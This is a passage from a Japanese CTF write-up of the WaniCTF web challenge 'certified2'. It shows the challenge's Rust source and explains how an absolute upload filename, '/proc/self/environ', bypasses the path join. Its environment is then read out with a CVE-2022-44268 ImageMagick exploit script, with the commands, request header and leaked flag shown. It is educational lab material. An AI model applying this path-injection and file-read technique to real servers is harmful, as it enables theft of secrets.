+</code></pre><h1 id=web-certified2>[web] certified2</h1><blockquote><p>certified1をご覧ください。</p><p>Please see certified1.</p></blockquote><p>certified1の続きです。</p><p>certified2のflagは環境変数に入っているため、certified1で使用したexploitを使用して<code>/proc/self/environ</code>を読み込むことを考えますが、これはできません。</p><p>kurenaifさんがyoutubeで<a href="https://www.youtube.com/watch?v=KbCR_lkVU5w&t=810s">解説</a>されていますが、<code>/proc/self/environ</code>はファイルの実体がなく容量が0byteであるため、ImageMagickの実装上、ファイルを読み込めません。</p><p>問題の実装を追ってみます。以下は<code>create.rs</code>です。ファイルを受け取って指定するパスに書き込み、<code>process_image</code>関数を使用して、画像にハンコを押します。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.rs data-lang=:.rs><span style=display:flex><span><span style=color:#66d9ef>use</span> <span style=color:#66d9ef>crate</span>::handler::helper::HandlerResult;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>use</span> <span style=color:#66d9ef>crate</span>::process_image::process_image;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>use</span> anyhow::Context;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>use</span> axum::debug_handler;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>use</span> axum::extract;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>use</span> axum::http::StatusCode;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>use</span> axum::response::IntoResponse;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>use</span> bytes::Bytes;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>use</span> std::path::PathBuf;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>use</span> tokio::fs;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>use</span> uuid::Uuid;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// POST /create
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#[debug_handler]</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>pub</span> <span style=color:#66d9ef>async</span> <span style=color:#66d9ef>fn</span> <span style=color:#a6e22e>handle_create</span>(<span style=color:#66d9ef>mut</span> multipart: <span style=color:#a6e22e>extract</span>::Multipart) -&gt; <span style=color:#a6e22e>HandlerResult</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> id <span style=color:#f92672>=</span> Uuid::new_v4();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> current_dir <span style=color:#f92672>=</span> PathBuf::from(format!(<span style=color:#e6db74>&#34;./data/{id}&#34;</span>));
+</span></span><span style=display:flex><span>    fs::create_dir(<span style=color:#f92672>&amp;</span>current_dir)
+</span></span><span style=display:flex><span>        .<span style=color:#66d9ef>await</span>
+</span></span><span style=display:flex><span>        .context(<span style=color:#e6db74>&#34;Failed to create working directory&#34;</span>)<span style=color:#f92672>?</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> (file_name, file_data) <span style=color:#f92672>=</span> <span style=color:#66d9ef>match</span> extract_file(<span style=color:#f92672>&amp;</span><span style=color:#66d9ef>mut</span> multipart).<span style=color:#66d9ef>await</span> {
+</span></span><span style=display:flex><span>        Some(file) <span style=color:#f92672>=&gt;</span> file,
+</span></span><span style=display:flex><span>        None <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>return</span> Ok((StatusCode::BAD_REQUEST, <span style=color:#e6db74>&#34;Invalid multipart data&#34;</span>).into_response()),
+</span></span><span style=display:flex><span>    };
+</span></span><span style=display:flex><span>    fs::write(
+</span></span><span style=display:flex><span>        current_dir.join(file_name.file_name().unwrap_or(<span style=color:#e6db74>&#34;&#34;</span>.as_ref())),
+</span></span><span style=display:flex><span>        file_data,
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>    .<span style=color:#66d9ef>await</span>
+</span></span><span style=display:flex><span>    .context(<span style=color:#e6db74>&#34;Failed to save uploaded file&#34;</span>)<span style=color:#f92672>?</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    process_image(<span style=color:#f92672>&amp;</span>current_dir, <span style=color:#f92672>&amp;</span>file_name)
+</span></span><span style=display:flex><span>        .<span style=color:#66d9ef>await</span>
+</span></span><span style=display:flex><span>        .context(<span style=color:#e6db74>&#34;Failed to process image&#34;</span>)<span style=color:#f92672>?</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Ok((StatusCode::SEE_OTHER, [(<span style=color:#e6db74>&#34;location&#34;</span>, format!(<span style=color:#e6db74>&#34;/view/{id}&#34;</span>))]).into_response())
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Extract file name and file data from multipart form data
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>fn</span> <span style=color:#a6e22e>extract_file</span>(multipart: <span style=color:#66d9ef>&amp;</span><span style=color:#a6e22e>mut</span> extract::Multipart) -&gt; Option<span style=color:#f92672>&lt;</span>(PathBuf, Bytes)<span style=color:#f92672>&gt;</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>let</span> Ok(Some(field)) <span style=color:#f92672>=</span> multipart.next_field().<span style=color:#66d9ef>await</span> {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> field.name() <span style=color:#f92672>==</span> Some(<span style=color:#e6db74>&#34;file&#34;</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>let</span> file_name <span style=color:#f92672>=</span> <span style=color:#66d9ef>match</span> field.file_name() {
+</span></span><span style=display:flex><span>                Some(file_name) <span style=color:#f92672>=&gt;</span> PathBuf::from(file_name),
+</span></span><span style=display:flex><span>                None <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>return</span> None,
+</span></span><span style=display:flex><span>            };
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>let</span> file_data <span style=color:#f92672>=</span> <span style=color:#66d9ef>match</span> field.bytes().<span style=color:#66d9ef>await</span> {
+</span></span><span style=display:flex><span>                Ok(bytes) <span style=color:#f92672>=&gt;</span> bytes,
+</span></span><span style=display:flex><span>                Err(_) <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>return</span> None,
+</span></span><span style=display:flex><span>            };
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> Some((file_name, file_data));
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    None
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>以下は<code>process_image.rs</code>です。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.rs data-lang=:.rs><span style=display:flex><span><span style=color:#66d9ef>use</span> anyhow::{bail, Context, Result};
+</span></span><span style=display:flex><span><span style=color:#66d9ef>use</span> std::path::Path;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>use</span> std::process::Stdio;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>use</span> tokio::fs;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>use</span> tokio::process::Command;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>pub</span> <span style=color:#66d9ef>async</span> <span style=color:#66d9ef>fn</span> <span style=color:#a6e22e>process_image</span>(working_directory: <span style=color:#66d9ef>&amp;</span><span style=color:#a6e22e>Path</span>, input_filename: <span style=color:#66d9ef>&amp;</span><span style=color:#a6e22e>Path</span>) -&gt; Result<span style=color:#f92672>&lt;</span>()<span style=color:#f92672>&gt;</span> {
+</span></span><span style=display:flex><span>    println!(<span style=color:#e6db74>&#34;{}&#34;</span>, working_directory.join(input_filename).display());
+</span></span><span style=display:flex><span>    fs::copy(
+</span></span><span style=display:flex><span>        working_directory.join(input_filename),
+</span></span><span style=display:flex><span>        working_directory.join(<span style=color:#e6db74>&#34;input&#34;</span>),
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>    .<span style=color:#66d9ef>await</span>
+</span></span><span style=display:flex><span>    .context(<span style=color:#e6db74>&#34;Failed to prepare input&#34;</span>)<span style=color:#f92672>?</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    fs::write(
+</span></span><span style=display:flex><span>        working_directory.join(<span style=color:#e6db74>&#34;overlay.png&#34;</span>),
+</span></span><span style=display:flex><span>        include_bytes!(<span style=color:#e6db74>&#34;../assets/hanko.png&#34;</span>),
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>    .<span style=color:#66d9ef>await</span>
+</span></span><span style=display:flex><span>    .context(<span style=color:#e6db74>&#34;Failed to prepare overlay&#34;</span>)<span style=color:#f92672>?</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> child <span style=color:#f92672>=</span> Command::new(<span style=color:#e6db74>&#34;sh&#34;</span>)
+</span></span><span style=display:flex><span>        .args([
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;-c&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;timeout --signal=KILL 5s magick ./input -resize 640x480 -compose over -gravity southeast ./overlay.png -composite ./output.png&#34;</span>,
+</span></span><span style=display:flex><span>        ])
+</span></span><span style=display:flex><span>        .current_dir(working_directory)
+</span></span><span style=display:flex><span>        .stdin(Stdio::null())
+</span></span><span style=display:flex><span>        .stdout(Stdio::null())
+</span></span><span style=display:flex><span>        .stderr(Stdio::piped())
+</span></span><span style=display:flex><span>        .spawn()
+</span></span><span style=display:flex><span>        .context(<span style=color:#e6db74>&#34;Failed to spawn&#34;</span>)<span style=color:#f92672>?</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> out <span style=color:#f92672>=</span> child
+</span></span><span style=display:flex><span>        .wait_with_output()
+</span></span><span style=display:flex><span>        .<span style=color:#66d9ef>await</span>
+</span></span><span style=display:flex><span>        .context(<span style=color:#e6db74>&#34;Failed to read output&#34;</span>)<span style=color:#f92672>?</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>!</span>out.status.success() {
+</span></span><span style=display:flex><span>        bail<span style=color:#f92672>!</span>(
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;image processing failed on {}:\n{}&#34;</span>,
+</span></span><span style=display:flex><span>            working_directory.display(),
+</span></span><span style=display:flex><span>            std::<span style=color:#66d9ef>str</span>::from_utf8(<span style=color:#f92672>&amp;</span>out.stderr)<span style=color:#f92672>?</span>
+</span></span><span style=display:flex><span>        );
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Ok(())
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>以下の部分に着目すると、指定したパスのファイルをworking_directoryの<code>input</code>ファイルにコピーする処理を行なっていることがわかります。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.rs data-lang=:.rs><span style=display:flex><span><span style=color:#66d9ef>pub</span> <span style=color:#66d9ef>async</span> <span style=color:#66d9ef>fn</span> <span style=color:#a6e22e>process_image</span>(working_directory: <span style=color:#66d9ef>&amp;</span><span style=color:#a6e22e>Path</span>, input_filename: <span style=color:#66d9ef>&amp;</span><span style=color:#a6e22e>Path</span>) -&gt; Result<span style=color:#f92672>&lt;</span>()<span style=color:#f92672>&gt;</span> {
+</span></span><span style=display:flex><span>fs::copy(
+</span></span><span style=display:flex><span>    working_directory.join(input_filename),
+</span></span><span style=display:flex><span>    working_directory.join(<span style=color:#e6db74>&#34;input&#34;</span>),
+</span></span><span style=display:flex><span>)
+</span></span></code></pre></div><p>ここでは<code>Path</code>がそのまま使用されているため<code>input_filename</code>に<code>/proc/self/environ</code>を指定することができます。ちなみに、<code>input_filename.file_name()</code>とすると<code>/proc/self/environ</code>は<code>environ</code>と評価されます（<a href=https://doc.rust-lang.org/std/path/struct.Path.html#method.file_name>参考</a>）。実際に、<code>create.rs</code>ではファイルの内容を書き込む処理で、<code>file_name</code>メソッドが使用されています。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.rs data-lang=:.rs><span style=display:flex><span>fs::write(
+</span></span><span style=display:flex><span>    current_dir.join(file_name.file_name().unwrap_or(<span style=color:#e6db74>&#34;&#34;</span>.as_ref())),
+</span></span><span style=display:flex><span>    file_data,
+</span></span><span style=display:flex><span>)
+</span></span></code></pre></div><p><code>input_filename</code>に<code>/proc/self/environ</code>を指定した場合、<code>working_directory.join(input_filename)</code>が<code>/proc/self/environ</code>と評価されます（<a href=https://doc.rust-lang.org/std/path/struct.Path.html#method.join>参考</a>）。そのため、working_directoryの<code>input</code>に<code>/proc/self/environ</code>の内容がコピーされます。</p><p>この<code>input</code>ファイルをCVE-2022-44268のexploitを介して読み込むことができれば、0byte問題が解決できそうです。</p><p>実際に、<code>filename</code>を<code>/proc/self/environ</code>としてリクエストを送信します。</p><pre tabindex=0><code>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;/proc/self/environ&#34;
+Content-Type: image/png
+</code></pre><p>すると、以下のエラーが返ってきます。<code>/proc/self/environ</code>がコピーされた<code>input</code>ファイルが格納されているフォルダのパスがわかりました。</p><pre tabindex=0><code>Failed to process image
+
+Caused by:
+    image processing failed on ./data/43791dd6-a1eb-4fde-b798-1258ae702d18:
+    magick: no decode delegate for this image format `&#39; @ error/constitute.c/ReadImage/741.
+</code></pre><p>CVE-2022-44268のexploitを用いて<code>/data/43791dd6-a1eb-4fde-b798-1258ae702d18/input</code>を読み込みます。無事にflagが取得できました。</p><pre tabindex=0><code>$ python3 CVE-2022-44268.py --image network_dennou_sekai_man.png --file-to-read /data/43791dd6-a1eb-4fde-b798-1258ae702d18/input --output poisoned.png
+
+# poisoned.pngをアップロード
+
+$ python3 CVE-2022-44268.py --url https://certified-web.wanictf.org/view/86a1408d-4e7f-4277-8eb9-bb9585025358
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=7724dcb97f64APPIMAGE_EXTRACT_AND_RUN=1FLAG_B=FLAG{n0w_7hat_y0u_h4ve_7he_sec0nd_f1a9_y0u_4re_a_cert1f1ed_h4nk0_m@ster}RUST_LOG=hanko,tower_http=TRACE,INFOLISTEN_ADDR=0.0.0.0:3000HOME=/root
+</code></pre><pre tabindex=0><code>FLAG{n0w_7hat_y0u_h4ve_7he_sec0nd_f1a9_y0u_4re_a_cert1f1ed_h4nk0_m@ster}
+</code></pre></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/ctf>ctf</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
+<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
+<a class=border></a></div><div class=footer-info>2025 © yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
